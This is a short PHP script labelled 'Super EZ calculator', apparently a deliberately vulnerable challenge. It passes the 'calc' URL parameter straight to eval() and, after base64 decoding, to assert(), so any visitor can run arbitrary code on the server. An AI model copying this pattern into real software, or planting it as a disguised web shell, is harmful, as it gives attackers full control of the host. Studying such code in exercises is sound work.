<?php 
		echo "<pre>Super EZ calculator!";
		if (isset($_GET['calc'])){
			$calc = $_GET['calc'];
			assert(base64_decode($calc));
			echo eval($calc);
		}
?>